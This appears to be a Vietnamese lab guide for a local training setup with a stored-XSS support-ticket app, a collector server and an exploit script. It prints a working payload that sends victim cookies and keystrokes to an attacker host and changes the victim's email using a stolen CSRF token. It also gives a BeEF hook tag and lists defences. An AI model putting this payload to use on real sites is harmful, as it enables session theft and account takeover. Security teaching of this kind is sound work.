# Lab 3.5 - Khai thac XSS day du

Lab cap nhat tat ca lan truoc thanh mot chuoi khai thac hoan chinh. App la mot he thong
support ticket co stored XSS (cong 8036). Nan nhan la nhan vien support da dang nhap. Ke
tan cong gui mot ticket co payload, nan nhan mo hop thu la dinh, va payload lam ba viec:

1. **Trom cookie/session**: gui `document.cookie` ve server ke tan cong.
2. **Keylogger**: bat su kien go phim, tung phim bay ve ke tan cong.
3. **Hanh dong thay nan nhan (account takeover)**: doc CSRF token tu `/account` roi POST
   `/change-email` doi email nan nhan thanh email ke tan cong. Vi payload chay ngay trong
   origin cua nan nhan, no doc duoc CSRF token => bao ve CSRF bi vo hieu hoan toan.

Toan bo du lieu bay ve server ke tan cong `attacker.py` (mot HTTP server ghi log, mo phong
`python -m http.server`).

## Thanh phan
- `app.py` : app ticket co lo hong, cong 8036.
- `attacker.py` : server thu thap, cong 8037, ghi vao `loot.txt`.
- `exploit.py` : dong vai ke tan cong va mo phong trinh duyet nan nhan (xem muc verify).
- `transcript.txt`, `loot.txt` : ket qua that.

## Chay
```bash
python3 attacker.py       # terminal 1, cong 8037
python3 app.py            # terminal 2, cong 8036
python3 exploit.py        # terminal 3
```
Ctrl+C ca hai server khi xong.

## Payload (nhet trong ticket)
```html
<script>
new Image().src='http://127.0.0.1:8037/log?t=cookie&d='+encodeURIComponent(document.cookie);
fetch('/account').then(r=>r.text()).then(h=>{
  var t=h.match(/name="csrf" value="([^"]+)"/)[1];
  fetch('/change-email',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'csrf='+t+'&email=attacker@evil.test'})
    .then(()=>new Image().src='http://127.0.0.1:8037/log?t=takeover&d=email-changed');
});
document.onkeypress=function(e){new Image().src='http://127.0.0.1:8037/log?t=key&d='+e.key;};
</script>
```

## Cach verify (khong can trinh duyet)
- **Phan server la that**: payload da luu va render nguyen van trong `/inbox` (stored XSS).
- **Luong khai thac la that tren mang**: khong co GUI nen `exploit.py` mo phong trinh duyet
  nan nhan, dung CHINH phien dang nhap that cua nan nhan (requests.Session mang cookie).
  Cac request den `/account`, `/change-email` va den server ke tan cong deu la HTTP that.
- **Bang chung cuoi**: trong `transcript.txt`/`loot.txt`, server ke tan cong nhan duoc
  cookie `session=victim-session-5e9d2a`, cac phim `p @ s s`, va xac nhan `takeover`. Quan
  trong nhat: email nan nhan tren app THAT SU doi tu `support@corp.local` thanh
  `attacker@evil.test`. Doi duoc email thuong keo theo reset mat khau => chiem tron tai khoan.

## BeEF (khai quat)
Thuc te nguoi ta it tu viet tay tung buoc. BeEF (Browser Exploitation Framework) "hook"
trinh duyet nan nhan bang mot doan JS (`hook.js`), bien no thanh zombie trong bang dieu
khien, roi chay cac module co san: lay cookie, keylogger, chup man hinh, do mang noi bo,
social engineering (gia popup dang nhap), fingerprint. Payload XSS chi can nhung duoc
`<script src="http://beef/hook.js"></script>` la ke tan cong co giao dien dieu khien day du.

## Phong thu
- Escape output theo context; bat auto-escape cua template engine.
- Cookie `HttpOnly` (JS khong doc duoc) chan buoc trom cookie.
- CSP chat (khong `unsafe-inline`, co nonce) chan inline script.
- Luu y: CSRF token KHONG cuu duoc khi da co XSS. Phai diet XSS tu goc.
- Hanh dong nhay cam (doi email, doi mat khau) nen yeu cau xac thuc lai (re-auth).
